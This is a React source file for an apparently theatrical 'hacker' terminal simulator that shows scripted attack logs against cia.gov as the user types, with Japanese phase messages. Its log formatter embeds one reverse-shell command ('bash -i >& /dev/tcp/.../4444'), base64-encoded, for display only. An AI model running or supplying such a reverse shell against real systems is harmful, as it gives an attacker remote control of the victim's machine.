import React, { useState, useEffect, useRef } from 'react';
import { ALL_PHASE_TEMPLATES, REAL_CVE_DATABASE, AUTO_LOGS, MAX_PHASE, PHASE_NUMBERS, INITIAL_PHASE_MESSAGES, SHUTDOWN_LOGS } from './data';

interface LogEntry {
  text: string;
  timestamp: string;
}

const App: React.FC = () => {
  const [displayedLogs, setDisplayedLogs] = useState<LogEntry[]>([]);
  const [activeMessage, setActiveMessage] = useState<string>("Initializing hacker_os...");
  const [activeTask, setActiveTask] = useState<string>("BOOTING SYSTEM");
  const [targetIP, setTargetIP] = useState<string>("0.0.0.0");
  const [attackerIP] = useState(() => `${Math.floor(Math.random() * 200 + 40)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`);
  const [rawJSON, setRawJSON] = useState<string>("{}");
  const [gccOutput, setGccOutput] = useState<string>("");
  const [targetDomain] = useState(() => "cia.gov");
  const [phase, setPhase] = useState<number>(1);
  const [waitingForEnter, setWaitingForEnter] = useState(false);
  const [isSearching, setIsSearching] = useState(false);
  const [autoIdx, setAutoIdx] = useState<number>(-1);
  const [shutdownIdx, setShutdownIdx] = useState<number>(-1);
  
  const [cpuLoad, setCpuLoad] = useState<number>(12.4);
  const [netTraffic, setNetTraffic] = useState<string>("240.5 KB/s");
  const [uptime, setUptime] = useState<string>("00:00:00:00");
  const startTimeRef = useRef(Date.now());
  const logIndexRef = useRef(0);
  const keyCounterRef = useRef(0);
  const bottomRef = useRef<HTMLDivElement>(null);

  const getCurrentTimeInfo = () => {
    const now = new Date();
    return {
      full: now.toLocaleTimeString('en-US', { hour12: false }),
      date: now.toLocaleString('en-US', { month: 'short', day: 'numeric' }),
      simple: now.toLocaleTimeString('ja-JP', { hour12: false })
    };
  };

  const addLogs = (texts: string[]) => {
    const time = getCurrentTimeInfo();
    const newEntries = texts.map(t => {
      const processed = t
        .replace(/{TIME}/g, time.full)
        .replace(/{DATE}/g, time.date)
        .replace(/{IP}/g, targetIP)
        .replace(/{DOMAIN}/g, targetDomain)
        .replace(/{ATTACKER_IP}/g, attackerIP)
        .replace(/{B64_CMD}/g, btoa(`bash -i >& /dev/tcp/${attackerIP}/4444 0>&1`));
      return { text: processed, timestamp: time.simple };
    });
    setDisplayedLogs(prev => [...prev, ...newEntries]);
  };

  useEffect(() => {
    const fetchInitialData = async () => {
      try {
        const response = await fetch(`https://dns.google/resolve?name=${targetDomain}&type=A`);
        const data = await response.json();
        setRawJSON(JSON.stringify(data, null, 2));
        if (data.Answer?.[0]) setTargetIP(data.Answer[0].data);
      } catch (e) { setTargetIP("104.16.148.244"); }
      try {
        const response = await fetch('/gcc/gcc_output.txt');
        setGccOutput(await response.text());
      } catch (e) { setGccOutput("gcc: error: exploit.c: No such file"); }
    };
    fetchInitialData();
  }, [targetDomain]);

  useEffect(() => {
    const timer = setInterval(() => {
      setCpuLoad(prev => {
        const n = prev + (Math.random() - 0.5) * 3;
        return n < 8 ? 8.1 : n > 35 ? 34.9 : n;
      });
      setNetTraffic(`${(Math.random() * 400 + 100).toFixed(1)} KB/s`);
      const diff = Date.now() - startTimeRef.current;
      const pad = (n: number) => String(Math.floor(n)).padStart(2, '0');
      setUptime(`${pad(diff / 86400000)}:${pad((diff % 86400000) / 3600000)}:${pad((diff % 3600000) / 60000)}:${pad((diff % 60000) / 1000)}`);
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    if (autoIdx === -1) return;
    if (autoIdx >= AUTO_LOGS.length) {
      setAutoIdx(-1);
      logIndexRef.current += 1;
      const current = ALL_PHASE_TEMPLATES[phase];
      if (current && logIndexRef.current >= current.length) {
        if (phase < MAX_PHASE) {
          setWaitingForEnter(true);
          setActiveMessage(`フェーズ${phase}完了。[ENTER]で次へ。`);
        } else {
          setActiveMessage("全シーケンスが完了しました。");
          setActiveTask("MISSION ACCOMPLISHED");
        }
      }
      return;
    }
    const timer = setTimeout(() => {
      addLogs([AUTO_LOGS[autoIdx]]);
      setAutoIdx(prev => prev + 1);
    }, 300);
    return () => clearTimeout(timer);
  }, [autoIdx, phase]);

  useEffect(() => {
    if (shutdownIdx === -1) return;
    if (shutdownIdx >= SHUTDOWN_LOGS.length) {
      setShutdownIdx(-1);
      logIndexRef.current += 1;
      const current = ALL_PHASE_TEMPLATES[phase];
      if (current && logIndexRef.current >= current.length) {
        if (phase < MAX_PHASE) {
          setWaitingForEnter(true);
          setActiveMessage(`フェーズ${phase}完了。[ENTER]で次へ。`);
        } else {
          setActiveMessage("全シーケンスが完了しました。");
          setActiveTask("MISSION ACCOMPLISHED");
        }
      }
      return;
    }
    const timer = setTimeout(() => {
      addLogs([SHUTDOWN_LOGS[shutdownIdx]]);
      setShutdownIdx(prev => prev + 1);
    }, 100);
    return () => clearTimeout(timer);
  }, [shutdownIdx, phase]);

  const jumpToPhase = (p: number) => {
    if (p > MAX_PHASE) return;
    setPhase(p);
    logIndexRef.current = 0;
    keyCounterRef.current = 0;
    setWaitingForEnter(false);
    setIsSearching(false);
    setAutoIdx(-1);
    setShutdownIdx(-1);
    setDisplayedLogs([]);
    setActiveMessage(INITIAL_PHASE_MESSAGES[p]);
    setActiveTask("INITIALIZING...");
  };

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (isSearching || autoIdx !== -1 || shutdownIdx !== -1) return;

      if (waitingForEnter) {
        if (e.key === 'Enter') {
          const next = phase + 1;
          jumpToPhase(next);
        }
        return;
      }

      if (e.key.length > 1 && !['Enter', 'Space', 'Backspace'].includes(e.key)) return;
      
      keyCounterRef.current += 1;
      if (keyCounterRef.current >= 2) {
        keyCounterRef.current = 0;
        const current = ALL_PHASE_TEMPLATES[phase];
        if (!current || logIndexRef.current >= current.length) return;
        
        const item = current[logIndexRef.current];
        
        if (item.log === "{RAW_JSON}") addLogs([rawJSON]);
        else if (item.log === "{CVE_DATA}") addLogs(REAL_CVE_DATABASE);
        else if (item.log === "{GCC_OUTPUT}") addLogs(gccOutput.split('\n'));
        else if (item.log === "{WAIT_SEARCH}") {
          setIsSearching(true);
          addLogs(["Processing... [WAIT]"]);
          setTimeout(() => {
            addLogs(["Complete."]);
            setIsSearching(false);
            logIndexRef.current += 1;
            if (logIndexRef.current >= current.length) {
              if (phase < MAX_PHASE) {
                setWaitingForEnter(true);
                setActiveMessage(`フェーズ${phase}完了。[ENTER]で次へ。`);
              } else {
                setActiveMessage("全シーケンスが完了しました。");
                setActiveTask("MISSION ACCOMPLISHED");
              }
            }
          }, 2000);
          return;
        } else if (item.log === "{AUTO_PIPELINE}") {
          setAutoIdx(0);
          return;
        } else if (item.log === "{SHUTDOWN_SEQUENCE}") {
          setShutdownIdx(0);
          return;
        } else {
          addLogs([item.log]);
        }
        
        setActiveMessage(item.msg);
        setActiveTask(item.task);
        logIndexRef.current += 1;

        if (logIndexRef.current >= current.length) {
          if (phase < MAX_PHASE) {
            setWaitingForEnter(true);
            setActiveMessage(`フェーズ${phase}完了。[ENTER]で次へ。`);
          } else {
            setActiveMessage("全シーケンスが完了しました。");
            setActiveTask("MISSION ACCOMPLISHED");
          }
        }
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [targetIP, attackerIP, rawJSON, gccOutput, phase, waitingForEnter, isSearching, autoIdx, shutdownIdx]);

  useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [displayedLogs]);

  const lastTargetIdx = displayedLogs.findLastIndex(l => l.text.includes('@target-server') || ['www-data','root'].includes(l.text));
  const lastLogoutIdx = displayedLogs.findLastIndex(l => l.text === 'logout');
  const isTarget = lastTargetIdx > lastLogoutIdx;

  return (
    <div className="bg-black h-screen w-screen text-[#00ff41] flex overflow-hidden font-['JetBrains_Mono'] leading-none">
      <div className="fixed inset-0 pointer-events-none opacity-5 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_2px,3px_100%] z-50"></div>
      <div className="w-2/3 h-full p-8 flex flex-col justify-start items-start overflow-y-auto border-r border-[#00ff41]/20 scrollbar-hide">
        <div className="w-full flex flex-col text-base md:text-lg pb-24 tracking-tighter">
          {displayedLogs.map((log, i) => (
            <div key={i} className="flex space-x-3 py-0">
              <span className="opacity-40 text-[11px] shrink-0 mt-1">[{log.timestamp}]</span>
              <span className={`
                whitespace-pre-wrap
                ${log.text.includes('@target-server') || ['www-data','root','logout'].includes(log.text) ? 'text-[#ffb000]' : ''}
                ${log.text.includes('warning:') || log.text.includes('error:') ? 'text-white italic opacity-80' : ''}
                ${['[BUILD]','[TEST]','[DEPLOY]','[CHECK]'].some(p => log.text.startsWith(p)) ? 'text-purple-300' : ''}
                ${log.text.startsWith('[SUCCESS]') ? 'text-cyan-400 font-bold' : ''}
                ${log.text.startsWith('[INFO]') ? 'text-yellow-100 font-bold' : ''}
                ${log.text.startsWith('[!]') ? 'text-red-500 font-black' : ''}
                ${log.text.startsWith('[  OK  ]') ? 'text-[#00ff41] font-bold' : ''}
                ${log.text.startsWith('[SEND]') || log.text.startsWith('[RECV]') ? 'text-[#00ff41] font-bold' : ''}
                ${log.text.startsWith('[RUN]') || log.text.startsWith('[DONE]') ? 'text-[#00ff41] font-bold' : ''}
                ${log.text.startsWith('---') ? 'text-white/20' : ''}
                ${log.text.startsWith('●') ? 'text-red-500 animate-pulse' : ''}
                ${log.text.includes('Active: deactivating') ? 'text-yellow-400 italic' : ''}
                ${log.text.includes('Main PID:') ? 'text-white/70' : ''}
              `}>{log.text}</span>
            </div>
          ))}
          <div className="flex items-center space-x-4 pt-3">
            <span className={`font-bold shrink-0 opacity-80 ${isTarget ? 'text-[#ffb000]' : 'text-[#00ff41]'}`}>
              {isTarget ? (displayedLogs.findLast(l => l.text.includes('root')) ? 'root@target-server:/#' : 'www-data@target-server:/$') : 'root@hacker_os:~#'}
            </span>
            {waitingForEnter ? <span className="text-white font-bold text-sm bg-green-900 px-2 py-1 ml-2 border border-white/20">PRESS [ENTER]</span> : 
             autoIdx !== -1 || shutdownIdx !== -1 ? <span className="text-purple-400 font-bold text-sm ml-2 tracking-widest uppercase">Executing Payload... [AUTO]</span> :
             <span className={`w-2.5 h-5 ${isTarget ? 'bg-[#ffb000]' : 'bg-[#00ff41]'}`}></span>}
          </div>
          <div ref={bottomRef} />
        </div>
      </div>
      <div className="w-1/3 h-full bg-[#001100] p-10 flex flex-col z-20 shadow-[-10px_0_30px_rgba(0,0,0,0.5)] border-l border-[#00ff41]/10 overflow-hidden">
        <div className="mb-6 flex gap-2 overflow-x-auto pb-2 scrollbar-hide shrink-0">
          {PHASE_NUMBERS.map((p) => (
            <button key={p} onClick={() => jumpToPhase(p)} className={`text-[11px] px-3 py-1 border transition-all duration-300 ${phase === p ? 'bg-[#00ff41] text-black border-[#00ff41] font-bold shadow-[0_0_10px_rgba(0,255,0,0.5)]' : 'bg-transparent text-[#00ff41] border-[#00ff41]/30 hover:border-[#00ff41]'}`}>PHASE {p}</button>
          ))}
        </div>
        <div className="mb-8 border-b border-[#00ff41]/30 pb-4 shrink-0 text-sm font-bold text-[#00ff41] uppercase tracking-wider">
          System Narrative Monitor<br/>
          <span className="text-cyan-400 text-base">ACTIVE PHASE: {phase}</span><br/>
          <span className="text-green-500">TASK: {activeTask}</span>
        </div>
        <div className="flex-1 flex flex-col justify-center min-h-0 py-10">
          <div className="w-full bg-[#002200] border-l-4 border-green-500 p-8 shadow-[0_0_30px_rgba(0,255,0,0.1)]">
            <p className="text-green-100 text-lg md:text-xl xl:text-2xl font-sans whitespace-pre-wrap leading-relaxed">{activeMessage}</p>
          </div>
        </div>
        <div className="mt-auto opacity-60 text-[13px] space-y-4 font-mono border-t border-[#00ff41]/10 pt-8 shrink-0">
          <div className="flex justify-between"><span>CPU LOAD:</span><span className="text-white font-bold text-base">{cpuLoad.toFixed(1)}%</span></div>
          <div className="flex justify-between"><span>NET TRAFFIC:</span><span className="text-white font-bold text-base">{netTraffic}</span></div>
          <div className="flex justify-between"><span>SESSION UPTIME:</span><span className="text-white font-bold text-base">{uptime}</span></div>
        </div>
      </div>
    </div>
  );
};

export default App;
